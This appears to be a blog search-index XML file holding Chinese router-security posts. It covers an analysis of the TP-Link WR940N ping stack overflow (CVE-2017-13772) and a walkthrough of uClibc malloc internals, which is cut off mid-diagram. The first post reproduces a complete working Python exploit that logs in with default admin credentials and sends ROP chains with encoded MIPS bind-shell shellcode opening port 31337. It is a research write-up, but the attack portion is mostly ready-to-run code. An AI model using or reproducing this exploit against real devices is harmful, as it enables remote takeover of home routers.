<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[一步一步pwn路由器之wr940栈溢出漏洞分析与利用]]></title>
      <url>//%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AE%89%E5%85%A8/2017-10-29-%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5pwn%E8%B7%AF%E7%94%B1%E5%99%A8%E4%B9%8Bwr940%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这个是最近爆出来的漏洞，漏洞编号：<a href="https://www.fidusinfosec.com/tp-link-remote-code-execution-cve-2017-13772/" target="_blank" rel="external">CVE-2017-13772</a></p>
<p>固件链接：<a href="http://static.tp-link.com/TL-WR940N(US)_V4_160617_1476690524248q.zip" target="_blank" rel="external">http://static.tp-link.com/TL-WR940N(US)_V4_160617_1476690524248q.zip</a></p>
<p>之前使用 <code>firmadyn</code> 可以正常模拟运行，但是调试不了，就没有仔细看这个漏洞。今天突然想起 他会启动一个 <code>ssh</code> 服务，那我们是不是就可以通过<code>ssh</code> 连上去进行调试，正想试试，又不能正常模拟了。。。。。下面看具体漏洞。</p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>漏洞位管理员用来     <code>ping</code> 的功能，程序在获取<code>ip</code> 地址时没有验证长度，然后复制到栈上，造成栈溢出。搜索关键字符串 <code>ping_addr</code> 定位到函数 <code>sub_453C50</code></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15092873431355nyiesez.png?imageslim" alt="paste image"><br>获取 <code>ip</code> 地址后，把字符串指针放到 <code>$s6</code>寄存器，跟下去看看。<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1509287498785ykojz8u0.png?imageslim" alt="paste image"></p>
<p>传入了<code>ipAddrDispose</code>函数，继续分析之：</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509287595268qwyfsd2y.png?imageslim" alt="paste image"><br>先调用了 <code>memset</code>  初始化缓冲区，然后调用 <code>strcpy</code> 把 <code>ip</code> 地址复制到栈上，溢出。</p>
<p>利用的话和前文是一样的，经典的栈溢出，经典的 rop。</p>
<p><a href="https://jinyu00.github.io/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AE%89%E5%85%A8/2017-10-28-%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5pwn%E8%B7%AF%E7%94%B1%E5%99%A8%E4%B9%8Brop%E6%8A%80%E6%9C%AF%E5%AE%9E%E6%88%98.html">一步一步pwn路由器之rop技术实战</a></p>
<p><a href="https://jinyu00.github.io/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AE%89%E5%85%A8/2017-10-26-%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5pwn%E8%B7%AF%E7%94%B1%E5%99%A8%E4%B9%8B%E8%B7%AF%E7%94%B1%E5%99%A8%E7%8E%AF%E5%A2%83%E4%BF%AE%E5%A4%8D-rop%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90.html">一步一步pwn路由器之路由器环境修复&amp;&amp;rop技术分析</a></p>
<p>附上参考链接里的 <code>exp</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/python</div><div class="line"># -*- coding: UTF-8 -*-</div><div class="line">import urllib2</div><div class="line">import base64</div><div class="line">import hashlib</div><div class="line">from optparse import *</div><div class="line">import sys</div><div class="line">import urllib</div><div class="line"></div><div class="line">banner = (</div><div class="line">&quot;___________________________________________________________________________\n&quot;</div><div class="line">&quot;WR940N Authenticated Remote Code Exploit\n&quot;</div><div class="line">&quot;This exploit will open a bind shell on the remote target\n&quot;</div><div class="line">&quot;The port is 31337, you can change that in the code if you wish\n&quot;</div><div class="line">&quot;This exploit requires authentication, if you know the creds, then\n&quot;</div><div class="line">&quot;use the -u -p options, otherwise default is admin:admin\n&quot;</div><div class="line">&quot;___________________________________________________________________________&quot;</div><div class="line">)</div><div class="line"></div><div class="line">def login(ip, user, pwd):</div><div class="line">	print &quot;[+] Attempting to login to http://%s %s:%s&quot;%(ip,user,pwd)</div><div class="line">	#### Generate the auth cookie of the form b64enc(&apos;admin:&apos; + md5(&apos;admin&apos;))</div><div class="line">	hash = hashlib.md5()</div><div class="line">	hash.update(pwd)</div><div class="line">	auth_string = &quot;%s:%s&quot; %(user, hash.hexdigest())</div><div class="line">	encoded_string = base64.b64encode(auth_string)</div><div class="line"></div><div class="line">	print &quot;[+] Encoded authorisation: %s&quot; %encoded_string#### Send the request</div><div class="line">	url = &quot;http://&quot; + ip + &quot;/userRpm/LoginRpm.htm?Save=Save&quot;</div><div class="line">	print &quot;[+] sending login to &quot; + url</div><div class="line">	req = urllib2.Request(url)</div><div class="line">	req.add_header(&apos;Cookie&apos;, &apos;Authorization=Basic %s&apos; %encoded_string)</div><div class="line">	resp = urllib2.urlopen(req)</div><div class="line">	#### The server generates a random path for further requests, grab that here</div><div class="line">	data = resp.read()</div><div class="line">	next_url = &quot;http://%s/%s/userRpm/&quot; %(ip, data.split(&quot;/&quot;)[3])</div><div class="line">	print &quot;[+] Got random path for next stage, url is now %s&quot; %next_url</div><div class="line">	return (next_url, encoded_string)</div><div class="line"></div><div class="line">#custom bind shell shellcode with very simple xor encoder</div><div class="line">#followed by a sleep syscall to flush cash before running</div><div class="line">#bad chars = 0x20, 0x00</div><div class="line">shellcode = (</div><div class="line">#encoder</div><div class="line">&quot;\x22\x51\x44\x44\x3c\x11\x99\x99\x36\x31\x99\x99&quot;</div><div class="line">&quot;\x27\xb2\x05\x4b&quot; #0x27b2059f for first_exploit</div><div class="line">&quot;\x22\x52\xfc\xa0\x8e\x4a\xfe\xf9&quot;</div><div class="line">&quot;\x02\x2a\x18\x26\xae\x43\xfe\xf9\x8e\x4a\xff\x41&quot;</div><div class="line">&quot;\x02\x2a\x18\x26\xae\x43\xff\x41\x8e\x4a\xff\x5d&quot;</div><div class="line">&quot;\x02\x2a\x18\x26\xae\x43\xff\x5d\x8e\x4a\xff\x71&quot;</div><div class="line">&quot;\x02\x2a\x18\x26\xae\x43\xff\x71\x8e\x4a\xff\x8d&quot;</div><div class="line">&quot;\x02\x2a\x18\x26\xae\x43\xff\x8d\x8e\x4a\xff\x99&quot;</div><div class="line">&quot;\x02\x2a\x18\x26\xae\x43\xff\x99\x8e\x4a\xff\xa5&quot;</div><div class="line">&quot;\x02\x2a\x18\x26\xae\x43\xff\xa5\x8e\x4a\xff\xad&quot;</div><div class="line">&quot;\x02\x2a\x18\x26\xae\x43\xff\xad\x8e\x4a\xff\xb9&quot;</div><div class="line">&quot;\x02\x2a\x18\x26\xae\x43\xff\xb9\x8e\x4a\xff\xc1&quot;</div><div class="line">&quot;\x02\x2a\x18\x26\xae\x43\xff\xc1&quot;</div><div class="line"></div><div class="line">#sleep</div><div class="line">&quot;\x24\x12\xff\xff\x24\x02\x10\x46\x24\x0f\x03\x08&quot;</div><div class="line">&quot;\x21\xef\xfc\xfc\xaf\xaf\xfb\xfe\xaf\xaf\xfb\xfa&quot;</div><div class="line">&quot;\x27\xa4\xfb\xfa\x01\x01\x01\x0c\x21\x8c\x11\x5c&quot;</div><div class="line"></div><div class="line">################ encoded shellcode ###############</div><div class="line">&quot;\x27\xbd\xff\xe0\x24\x0e\xff\xfd\x98\x59\xb9\xbe\x01\xc0\x28\x27\x28\x06&quot;</div><div class="line">&quot;\xff\xff\x24\x02\x10\x57\x01\x01\x01\x0c\x23\x39\x44\x44\x30\x50\xff\xff&quot;</div><div class="line">&quot;\x24\x0e\xff\xef\x01\xc0\x70\x27\x24\x0d&quot;</div><div class="line">&quot;\x7a\x69&quot;            #&lt;————————- PORT 0x7a69 (31337)</div><div class="line">&quot;\x24\x0f\xfd\xff\x01\xe0\x78\x27\x01\xcf\x78\x04\x01\xaf\x68\x25\xaf\xad&quot;</div><div class="line">&quot;\xff\xe0\xaf\xa0\xff\xe4\xaf\xa0\xff\xe8\xaf\xa0\xff\xec\x9b\x89\xb9\xbc&quot;</div><div class="line">&quot;\x24\x0e\xff\xef\x01\xc0\x30\x27\x23\xa5\xff\xe0\x24\x02\x10\x49\x01\x01&quot;</div><div class="line">&quot;\x01\x0c\x24\x0f\x73\x50&quot;</div><div class="line">&quot;\x9b\x89\xb9\xbc\x24\x05\x01\x01\x24\x02\x10\x4e\x01\x01\x01\x0c\x24\x0f&quot;</div><div class="line">&quot;\x73\x50\x9b\x89\xb9\xbc\x28\x05\xff\xff\x28\x06\xff\xff\x24\x02\x10\x48&quot;</div><div class="line">&quot;\x01\x01\x01\x0c\x24\x0f\x73\x50\x30\x50\xff\xff\x9b\x89\xb9\xbc\x24\x0f&quot;</div><div class="line">&quot;\xff\xfd\x01\xe0\x28\x27\xbd\x9b\x96\x46\x01\x01\x01\x0c\x24\x0f\x73\x50&quot;</div><div class="line">&quot;\x9b\x89\xb9\xbc\x28\x05\x01\x01\xbd\x9b\x96\x46\x01\x01\x01\x0c\x24\x0f&quot;</div><div class="line">&quot;\x73\x50\x9b\x89\xb9\xbc\x28\x05\xff\xff\xbd\x9b\x96\x46\x01\x01\x01\x0c&quot;</div><div class="line">&quot;\x3c\x0f\x2f\x2f\x35\xef\x62\x69\xaf\xaf\xff\xec\x3c\x0e\x6e\x2f\x35\xce&quot;</div><div class="line">&quot;\x73\x68\xaf\xae\xff\xf0\xaf\xa0\xff\xf4\x27\xa4\xff\xec\xaf\xa4\xff\xf8&quot;</div><div class="line">&quot;\xaf\xa0\xff\xfc\x27\xa5\xff\xf8\x24\x02\x0f\xab\x01\x01\x01\x0c\x24\x02&quot;</div><div class="line">&quot;\x10\x46\x24\x0f\x03\x68\x21\xef\xfc\xfc\xaf\xaf\xfb\xfe\xaf\xaf\xfb\xfa&quot;</div><div class="line">&quot;\x27\xa4\xfb\xfe\x01\x01\x01\x0c\x21\x8c\x11\x5c&quot;</div><div class="line">)</div><div class="line"></div><div class="line">###### useful gadgets #######</div><div class="line">nop = &quot;\x22\x51\x44\x44&quot;</div><div class="line">gadg_1 = &quot;\x2A\xB3\x7C\x60&quot;  # set $a0 = 1, and jmp $s1</div><div class="line">gadg_2 = &quot;\x2A\xB1\x78\x40&quot;</div><div class="line">sleep_addr = &quot;\x2a\xb3\x50\x90&quot;</div><div class="line">stack_gadg = &quot;\x2A\xAF\x84\xC0&quot;</div><div class="line">call_code = &quot;\x2A\xB2\xDC\xF0&quot;</div><div class="line"></div><div class="line">def first_exploit(url, auth):</div><div class="line">	#          trash $s1        $ra</div><div class="line">	rop = &quot;A&quot;*164 + gadg_2  + gadg_1 + &quot;B&quot;*0x20 + sleep_addr + &quot;C&quot;*4</div><div class="line">	rop += &quot;C&quot;*0x1c + call_code + &quot;D&quot;*4 + stack_gadg + nop*0x20 + shellcode</div><div class="line"></div><div class="line">	params = &#123;&apos;ping_addr&apos;: rop, &apos;doType&apos;: &apos;ping&apos;, &apos;isNew&apos;: &apos;new&apos;, &apos;sendNum&apos;: &apos;20&apos;, &apos;pSize&apos;: &apos;64&apos;, &apos;overTime&apos;: &apos;800&apos;, &apos;trHops&apos;: &apos;20&apos;&#125;</div><div class="line"></div><div class="line">	new_url = url + &quot;PingIframeRpm.htm?&quot; + urllib.urlencode(params)</div><div class="line"></div><div class="line">	print &quot;[+] sending exploit…&quot;</div><div class="line">	print &quot;[+] Wait a couple of seconds before connecting&quot;</div><div class="line">	print &quot;[+] When you are finished do http -r to reset the http service&quot;</div><div class="line"></div><div class="line">	req = urllib2.Request(new_url)</div><div class="line">	req.add_header(&apos;Cookie&apos;, &apos;Authorization=Basic %s&apos; %auth)</div><div class="line">	req.add_header(&apos;Referer&apos;, url + &quot;DiagnosticRpm.htm&quot;)</div><div class="line"></div><div class="line">	resp = urllib2.urlopen(req)</div><div class="line"></div><div class="line">def second_exploit(url, auth):</div><div class="line">	url = url + &quot;WanStaticIpV6CfgRpm.htm?&quot;</div><div class="line">	#                 trash      s0      s1      s2       s3     s4      ret     shellcode</div><div class="line">	payload = &quot;A&quot;*111 + &quot;B&quot;*4 + gadg_2 + &quot;D&quot;*4 + &quot;E&quot;*4 + &quot;F&quot;*4 + gadg_1 + &quot;a&quot;*0x1c</div><div class="line">	payload += &quot;A&quot;*4 + sleep_addr + &quot;C&quot;*0x20 + call_code + &quot;E&quot;*4</div><div class="line">	payload += stack_gadg + &quot;A&quot;*4 +  nop*10 + shellcode + &quot;B&quot;*7</div><div class="line">	print len(payload)</div><div class="line"></div><div class="line">	params = &#123;&apos;ipv6Enable&apos;: &apos;on&apos;, &apos;wantype&apos;: &apos;2&apos;, &apos;ipType&apos;: &apos;2&apos;, &apos;mtu&apos;: &apos;1480&apos;, &apos;dnsType&apos;: &apos;1&apos;,</div><div class="line">	&apos;dnsserver2&apos;: payload, &apos;ipAssignType&apos;: &apos;0&apos;, &apos;ipStart&apos;: &apos;1000&apos;,</div><div class="line">	&apos;ipEnd&apos;: &apos;2000&apos;, &apos;time&apos;: &apos;86400&apos;, &apos;ipPrefixType&apos;: &apos;0&apos;, &apos;staticPrefix&apos;: &apos;AAAA&apos;,</div><div class="line">	&apos;staticPrefixLength&apos;: &apos;64&apos;, &apos;Save&apos;: &apos;Save&apos;, &apos;RenewIp&apos;: &apos;1&apos;&#125;</div><div class="line"></div><div class="line">	new_url = url + urllib.urlencode(params)</div><div class="line"></div><div class="line">	print &quot;[+] sending exploit…&quot;</div><div class="line">	print &quot;[+] Wait a couple of seconds before connecting&quot;</div><div class="line">	print &quot;[+] When you are finished do http -r to reset the http service&quot;</div><div class="line"></div><div class="line">	req = urllib2.Request(new_url)</div><div class="line">	req.add_header(&apos;Cookie&apos;, &apos;Authorization=Basic %s&apos; %auth)</div><div class="line">	req.add_header(&apos;Referer&apos;, url + &quot;WanStaticIpV6CfgRpm.htm&quot;)</div><div class="line"></div><div class="line">	resp = urllib2.urlopen(req)</div><div class="line"></div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">	print banner</div><div class="line">	username = &quot;admin&quot;</div><div class="line">	password = &quot;admin&quot;</div><div class="line"></div><div class="line">	(next_url, encoded_string) = login(&quot;192.168.0.1&quot;, username, password)</div><div class="line"></div><div class="line">	###### Both exploits result in the same bind shell ######</div><div class="line">	#first_exploit(data[0], data[1])</div><div class="line">	first_exploit(next_url, encoded_string)</div></pre></td></tr></table></figure>
<p>参考链接：</p>
<p><a href="https://www.fidusinfosec.com/tp-link-remote-code-execution-cve-2017-13772/" target="_blank" rel="external">https://www.fidusinfosec.com/tp-link-remote-code-execution-cve-2017-13772/</a></p>
]]></content>
      
        <categories>
            
            <category> 路由器安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CVE-2017-13772 </tag>
            
            <tag> 路由器实战 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[一步一步pwn路由器之uClibc中malloc&&free分析]]></title>
      <url>//%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AE%89%E5%85%A8/2017-10-28-%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5pwn%E8%B7%AF%E7%94%B1%E5%99%A8%E4%B9%8BuClibc%E4%B8%ADmalloc-free%E5%88%86%E6%9E%90.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>栈溢出告一段落。本文介绍下 <code>uClibc</code> 中的 <code>malloc</code> 和 <code>free</code> 实现。为堆溢出的利用准备基础。<code>uClibc</code> 是 <code>glibc</code> 的一个精简版，主要用于嵌入式设备，比如路由器就基本使用的是 <code>uClibc</code>， 简单自然效率高。所以他和一般的<code>x86</code>的堆分配机制会有些不一样。</p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>uClibc 的 <code>malloc</code> 有三种实现，分别为：</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509164969446w1f222m1.png?imageslim" alt="paste image"><br>其中 <code>malloc-standard</code> 是最近更新的。它就是把 <code>glibc</code> 的 <code>dlmalloc</code> 移植到了 <code>uClibc</code>中。<code>malloc</code> 是<code>uClibc</code>最开始版本用的 <code>malloc</code>。本文分析的也是<code>malloc</code>目录下的<code>uClibc</code>自己最初实现的 <code>malloc</code>。 因为如果是 <code>malloc-standard</code> 我们可以直接按照 一般 <code>linux</code> 中的堆漏洞相关的利用技巧来利用它。</p>
<p>现在编译 <code>uClibc</code> 的话默认使用的是  <code>malloc-standard</code> ，我也不知道该怎么切换，所以就纯静态看看 <code>malloc</code>目录下的实现了。</p>
<h4 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h4><p>从 <code>malloc</code> 的入口开始分析。 为了简单起见删掉了无关代码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">//malloc 返回一个指定大小为 __size 的指针。</div><div class="line"></div><div class="line">/*</div><div class="line">调用 malloc 申请空间时，先检查该链表中是否有满足条件的空闲区域节点</div><div class="line">如果没有，则向内核申请内存空间，放入这个链表中，然后再重新在链表中</div><div class="line">查找一次满足条件的空闲区域节点。</div><div class="line"></div><div class="line">它实际上是调用 malloc_from_heap 从空闲区域中申请空间。</div><div class="line"></div><div class="line">*/</div><div class="line"></div><div class="line">void *</div><div class="line">malloc (size_t size)</div><div class="line">&#123;</div><div class="line">  void *mem;</div><div class="line"></div><div class="line"></div><div class="line">  //参数有效性检测。这里没有检测参数为负的情况</div><div class="line"></div><div class="line">  if (unlikely (size == 0))</div><div class="line">    goto oom;</div><div class="line"></div><div class="line"></div><div class="line">  mem = malloc_from_heap (size, &amp;__malloc_heap, &amp;__malloc_heap_lock);</div><div class="line"></div><div class="line">  return mem;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><code>malloc</code> 实际使用的是 <code>malloc_from_heap</code> 来分配内存。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">static void *</div><div class="line">__malloc_from_heap (size_t size, struct heap_free_area **heap</div><div class="line">		)</div><div class="line">&#123;</div><div class="line">  void *mem</div><div class="line"></div><div class="line">  /* 一个 malloc 块的结构如下：</div><div class="line">  </div><div class="line">	  +--------+---------+-------------------+</div><div class="line">	  | SIZE   |(unused) | allocation  ...   |</div><div class="line">	  +--------+---------+-------------------+</div><div class="line">	  ^ BASE			 ^ ADDR</div><div class="line">	  ^ ADDR - MALLOC_ALIGN</div><div class="line">  </div><div class="line">	  申请成功后返回的地址是 ADDR</div><div class="line">	  SIZE 表示块的大小，包括前面的那部分，也就是 MALLOC_HEADER_SIZE</div><div class="line">   */</div><div class="line">  </div><div class="line">  //实际要分配的大小，叫上 header的大小</div><div class="line">  size += MALLOC_HEADER_SIZE;</div><div class="line"></div><div class="line">//加锁</div><div class="line">  __heap_lock (heap_lock);</div><div class="line"></div><div class="line">  /* First try to get memory that&apos;s already in our heap.  */</div><div class="line">  //首先尝试从heap分配内存.这函数见前面的分析</div><div class="line">  mem = __heap_alloc (heap, &amp;size);</div><div class="line"></div><div class="line">  __heap_unlock (heap_lock);</div><div class="line">  </div><div class="line">  /*</div><div class="line">  后面是分配失败的流程，会调用系统调用从操作系统分配内存到 heap, 然后再调用__heap_alloc，进行分配，本文不在分析。</div><div class="line">  */</div></pre></td></tr></table></figure>
<p>计算需要分配内存块的真实大小后进入  <code>__heap_alloc</code> 分配。</p>
<p>在 <code>heap</code>中使用 <code>heap_free_area</code> 来管理空闲内存，它定义在 <code>heap.h</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">/*</div><div class="line"></div><div class="line"></div><div class="line">struct heap_free_area</div><div class="line">&#123;</div><div class="line">	size_t size;  //空闲区的大小</div><div class="line">	 //用于构造循环链表</div><div class="line">	struct heap_free_area *next, *prev;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">size 表示该空闲区域的大小，这个空闲区域的实际地址并没有用指针详细地指明，</div><div class="line">因为它就位于当前 heap_free_area 节点的前面，如下图所示：</div><div class="line"></div><div class="line">+-------------------------------+--------------------+</div><div class="line">|                               |   heap_free_area   |</div><div class="line">+-------------------------------+--------------------+</div><div class="line">\___________ 空闲空间 ___________/\___ 空闲空间信息 ___/</div><div class="line"></div><div class="line"></div><div class="line">实际可用的空闲空间大小为 size – sizeof(struct heap_free_area)</div><div class="line"></div><div class="line">指针 next, prev 分别指向下一个和上一个空间区域，</div><div class="line">所有的空闲区域就是通过许许多多这样的节点链起来的，</div><div class="line">很显然，这样组成的是一个双向链表。</div><div class="line"></div><div class="line">*/</div></pre></td></tr></table></figure></p>
<p>所以 <code>free</code> 块在内存中的存储方式和 <code>glibc</code> 中的存储方式是不一样的。它的元数据在块的末尾，而 <code>glibc</code>中元数据在 块的开头。</p>
<p>下面继续分析 <code>__heap_alloc</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">/* </div><div class="line">   堆heap中分配size字节的内存</div><div class="line">   */</div><div class="line">void *</div><div class="line">__heap_alloc (struct heap_free_area **heap, size_t *size)</div><div class="line">&#123;</div><div class="line">  struct heap_free_area *fa;</div><div class="line">  size_t _size = *size;</div><div class="line">  void *mem = 0;</div><div class="line"></div><div class="line">  /* 根据 HEAP_GRANULARITY 大小向上取整，在 heap.h 中定义 */</div><div class="line"></div><div class="line">  _size = HEAP_ADJUST_SIZE (_size);</div><div class="line">  //如果要分配的内存比FA结构还要小，那就调整它为FA大小</div><div class="line">  </div><div class="line"></div><div class="line">  if (_size &lt; sizeof (struct heap_free_area))</div><div class="line">   </div><div class="line"></div><div class="line"> //根据HEAP_GRANULARITY 对齐 sizeof(double)</div><div class="line">    _size = HEAP_ADJUST_SIZE (sizeof (struct heap_free_area));</div><div class="line"></div><div class="line">	//遍历堆中的FA，找出有合适大小的空闲区,在空闲区域链表中查找大小大于等于 _SIZE 的节点 </div><div class="line">  for (fa = *heap; fa; fa = fa-&gt;next)</div><div class="line">    if (fa-&gt;size &gt;= _size)</div><div class="line">      &#123;</div><div class="line">		/* Found one!  */</div><div class="line">		mem = HEAP_FREE_AREA_START (fa);</div><div class="line">		 //从该空间中分得内存。这函数前面已经分析过了</div><div class="line">		*size = __heap_free_area_alloc (heap, fa, _size);</div><div class="line">		break;</div><div class="line">      &#125;</div><div class="line">  return mem;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>找到<code>大小 &gt;= 请求size</code> 的 <code>heap_free_area</code>，然后进入 <code>__heap_free_area_alloc 分配</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line">/* </div><div class="line">   该函数从fa所表示的heap_free_area中，分配size大小的内存</div><div class="line">   */</div><div class="line">static __inline__ size_t</div><div class="line">__heap_free_area_alloc (struct heap_free_area **heap,</div><div class="line">			struct heap_free_area *fa, size_t size)</div><div class="line">&#123;</div><div class="line">  size_t fa_size = fa-&gt;size;</div><div class="line"></div><div class="line">  //如果该空闲区剩余的内存太少。将它全部都分配出去</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">  if (fa_size &lt; size + HEAP_MIN_FREE_AREA_SIZE)</div><div class="line">    &#123;</div><div class="line">    ////将fa从heap中删除</div><div class="line">      __heap_delete (heap, fa);</div><div class="line">      /* Remember that we&apos;ve alloced the whole area.  */</div><div class="line">      size = fa_size;</div><div class="line">    &#125;</div><div class="line">  else</div><div class="line">	  /* 如果这个区域中还有空闲空间，就把 heap_free_area 节点中</div><div class="line">		   的 size 减小 size就可以了：</div><div class="line">	  </div><div class="line">		   分配前：</div><div class="line">		 __________ 空闲空间 __________ 	__ 空闲空间信息 __</div><div class="line">		/							   \ /					\</div><div class="line">		+-------------------------------+--------------------+</div><div class="line">		|								|	heap_free_area	